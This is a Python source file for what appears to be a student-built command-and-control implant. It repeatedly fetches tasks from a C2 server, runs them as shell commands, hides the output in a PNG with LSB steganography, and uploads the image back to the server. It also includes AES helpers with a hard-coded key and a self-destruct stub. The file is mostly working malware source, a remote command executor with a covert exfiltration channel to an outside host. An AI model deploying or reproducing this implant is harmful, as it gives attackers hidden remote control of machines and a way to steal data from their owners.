from Crypto.Cipher import AES
from stegano import lsb
import uuid
import requests
import subprocess
import time

global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")

url = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.

routes = {
    0 : url + "task", 
    1: url + "upload"
}

#Encryption of data -- IV is concatenated at the end of message for decryption
def encrypt(plain_str): 
    padding = 16 - (len(plain_str) % 16)
    cipher = AES.new(global_key, AES.MODE_CBC)
    plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
    encrypted = cipher.encrypt(plaintext)
    print(f"[*] Encrypted Message: {encrypted})")
    return encrypted + cipher.iv

#Decryption of data 
def decrypt(ciphertext): 
    init_v = ciphertext[-16:]
    cipher = AES.new(global_key, AES.MODE_CBC, init_v)
    msg = ciphertext[:-16]
    plaintext = cipher.decrypt(msg)
    plaintext = plaintext[:-plaintext[len(plaintext)-1]]
    print(f"[*] Unencrypted Message: {plaintext.decode()}")
    return msg 

#str is the encrypted string of data that needs to be hidden in a file. 
def mod_img(msg):
    path = "./images/"
    file_name = "safari-bird"
    encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
    encoded_img.save(f"{path}{file_name}-final.png")
    #Error Checking: 
    print("[*] Revealed from image:")
    print(lsb.reveal(f"{path}{file_name}-final.png"))
    return f"{path}{file_name}-final.png" 

#Execute command 
def exec(cmd): 
    result = ""
    if cmd == "sleep 10":
        print("[*] No commands. Sleeping...")
        time.sleep(10)
    else: 
        cmd_lst = cmd.split()
        if cmd_lst[0] == "destroy":
            destroy()
        elif cmd_lst[0] == "upload": 
            print(f"[+] Reading {cmd_lst[1]}")
            pass #needs to be implemented
        else: 
            print("[+] Executing command: %s" % cmd)
            output = subprocess.run(cmd_lst, capture_output=True, text=True)
            result = output.stdout 
            print("[+] Result: %s" % result)
    return result 

#Sending output back to C2Server 
def send_output(obf_img): 
    print("[+] Sending image back to server...")
    requests.post(routes[1], files={"file": open(obf_img,'rb')})
    return

#Called to clean up and destroy implant
def destroy(): 
    pass

#Setting up initial connection with C2 Server
def init(): 
    tries = 0
    while tries < 3: 
        print("[+] Contacting Server...")
        try:
            response = requests.get(url)
            print("[+] Connection Established...")
            print(response.text)
            return
        except Exception as e: 
            print("[-] Error in Contacting Server...")
            tries += 1
    print("[-] Failure in establishing connection.")
    destroy()
    exit(1) #If reached, server cannot be contacted, and must exit

#Gets task from GET request and executes 

def parse_json(response): 
    res_json = response.json()
    cmd = ""
    if res_json["task"] == None: 
        print("[-] Error in parsing JSON.")
        cmd = "echo 0" #just doing this to handle error case 
    else:
        cmd = res_json["task"]
    return cmd

if __name__ == '__main__':
    init()
    while True: 
        try: 
            #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
            #comment out encrypt and decrypt functions to test overall functionality (they won't work since IV is not shared between server and client yet.)
            response = requests.get(routes[0]) 
            encrypted_cmd = parse_json(response) 
            cipher_text = encrypt("Testing testing 123~")
            cmd = decrypt(cipher_text) 
            cmd = encrypted_cmd
            output = exec(cmd) 
            if output != "": 
                msg = encrypt(output)
                obf_img = mod_img(output)
                send_output(obf_img)
        except Exception as e: 
            print(e)
            break
            """
            Options for handling query failure: 
                - self destruct immediately 
                - try 3 times, the exit if all fail
                - sleep and try again, etc.
            """
    


    